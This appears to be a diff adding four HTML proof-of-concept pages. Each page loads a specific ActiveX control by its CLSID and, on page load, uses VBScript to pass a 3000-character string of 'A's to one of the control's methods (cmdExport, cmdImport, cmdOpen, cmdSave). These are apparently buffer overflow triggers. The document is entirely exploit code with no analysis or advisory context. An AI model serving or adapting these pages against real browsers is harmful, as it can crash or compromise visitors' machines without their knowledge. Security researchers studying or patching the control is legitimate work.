@@ -1,0 +1,47 @@
+1.
+
+<html>
+<body>
+<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target'></object>
+<script language='vbscript'>
+arg1=String(3000, "A")
+target.cmdExport arg1
+</script>
+</body>
+</html>
+
+2.
+
+<html>
+<body>
+<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target'></object>
+<script language='vbscript'>
+arg1=String(3000, "A")
+target.cmdImport arg1
+</script>
+</body>
+</html>
+
+3.
+
+<html>
+<body>
+<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target'></object>
+<script language='vbscript'>
+arg1=String(3000, "A")
+target.cmdOpen arg1
+</script>
+</body>
+</html>
+
+4.
+
+<html>
+<body>
+<object classid='clsid:32B165C1-AD31-11D5-8889-0010A4C62D06' id='target'></object>
+<script language='vbscript'>
+arg1=String(3000, "A")
+target.cmdSave arg1
+</script>
+</body>
+</html>
